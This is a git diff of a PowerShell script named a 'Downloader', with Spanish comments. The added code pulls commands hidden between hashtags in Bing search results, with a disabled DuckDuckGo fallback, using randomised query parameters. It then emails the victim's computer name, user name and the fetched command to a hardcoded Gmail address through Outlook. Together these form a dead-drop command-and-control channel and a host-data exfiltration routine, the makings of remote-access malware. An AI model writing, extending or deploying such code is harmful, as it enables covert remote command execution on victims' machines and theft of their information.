@@ -1,23 +1,57 @@
 #Downloader CUCHIBERRYROBIN
-$Conf_Hashtag_init="#11CUCHIBERRYROBIN"
+$Conf_Hashtag_init="#CUCHIBERRYROBIN"
 $Conf_Hashtag_end="#FIN"
+$Conf_email = "yocuchi@gmail.com" 
 
 #Not working, need workaround to get from google 
-$content = Invoke-WebRequest -Uri "https://www.google.com/search?q=$Conf_Hashtag_init" -UseBasicParsing
-$patron = '(?<=$Conf_Hashtag_init )(.*)(?= $Conf_Hashtag_end)'
-$resultado = [regex]::Match($content.Content, $patron).Value
-$from="Google"
-#Bun BING WORKS!!!
+#$content = Invoke-WebRequest -Uri "https://www.google.com/search?q=$Conf_Hashtag_init" -UseBasicParsing
+#$patron = '(?<=$Conf_Hashtag_init )(.*)(?= $Conf_Hashtag_end)'
+#$resultado = [regex]::Match($content.Content, $patron).Value
+#$from="Google"
+#Write-Output "Google $resultado "
+
+
+#Bun BING WORKS!!! in 2023 in 2024 no
 #Pero OPCION #TODO CIPHER XOR
 if (([string]::IsNullOrEmpty($resultado)))
 {
+$letras = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
+$numero = Get-Random -Minimum 1 -Maximum 1000
 $conf_hashtag_init_encoded = [System.Uri]::EscapeDataString($Conf_Hashtag_init)
-$content = Invoke-WebRequest -Uri "https://www.bing.com/search?q=$conf_hashtag_init_encoded" -UseBasicParsing
+$content = Invoke-WebRequest -Uri "https://www.bing.com/search?$letras=$numero&q=$conf_hashtag_init_encoded" -UseBasicParsing
 $patron = "(?<=$Conf_Hashtag_init\s)(.*?)(?=\s*$Conf_Hashtag_end)"
 $resultado = ($content | Select-String -Pattern $patron -AllMatches).Matches[0].Value
+Write-Output "URL: https://www.bing.com/search?$letras=$numero&q=$conf_hashtag_init_encoded"
+Write-Output "BING $resultado "
 $from="Bing"
 
 }
+#DUCK
+ #TODO CIPHER XOR
+ #Si no se ha encontrado resultado en las búsquedas anteriores
+ if(1>2)
+ #if (([string]::IsNullOrEmpty($resultado)))
+ {
+ #Generamos letras aleatorias para el parámetro de búsqueda
+ $letras = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
+ #Generamos un número aleatorio para el parámetro de búsqueda 
+ $numero = Get-Random -Minimum 1 -Maximum 1000
+ #Codificamos el hashtag para la URL
+ $conf_hashtag_init_encoded = [System.Uri]::EscapeDataString($Conf_Hashtag_init)
+ #Construimos la URL de búsqueda en DuckDuckGo
+ $url = "https://html.duckduckgo.com/html/?$letras=$numero&q=%7B$Conf_Hashtag_init%7D&a=b"
+ #Hacemos la petición web
+ $content = Invoke-WebRequest -Uri $url -UseBasicParsing
+ Write-Output "DUCK URL: $url"
+ #Definimos el patrón de búsqueda entre los hashtags
+ $patron = "(?<=$Conf_Hashtag_init\s)(.*?)(?=\s*$Conf_Hashtag_end)"
+ #Extraemos el resultado usando el patrón
+ $resultado = ($content | Select-String -Pattern $patron -AllMatches).Matches[0].Value
+ #Guardamos la fuente como DuckDuckGo
+ $from="Duck"
+ 
+ }
+
 
 
 
@@ -97,6 +131,35 @@ $notify = new-object system.windows.forms.notifyicon
 $notify.icon = $icon
 $notify.visible = $true
 $notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)
+}
+
+if (-not [string]::IsNullOrEmpty($Conf_email)) {
+    $computerInfo = Get-WmiObject -Class Win32_ComputerSystem
+    $computerName = $computerInfo.Name 
+    $userName = $computerInfo.UserName
+
+    $emailBody = @"
+Información de ejecución de comando $Conf_CharSet
+
+Equipo: $computerName
+Usuario: $userName
+Origen del comando: $from
+Comando ejecutado: $resultado
+
+"@
+
+    try {
+        $outlook = New-Object -ComObject Outlook.Application
+        $mail = $outlook.CreateItem(0)
+        $mail.To = $Conf_email
+        $mail.Subject = "Reporte $Conf_CharSet - $computerName"
+        $mail.Body = $emailBody
+        $mail.Send()
+        #[System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) 
+    }
+    catch {
+        Write-Output "Error al enviar email: $_"
+    }
 }
 
 
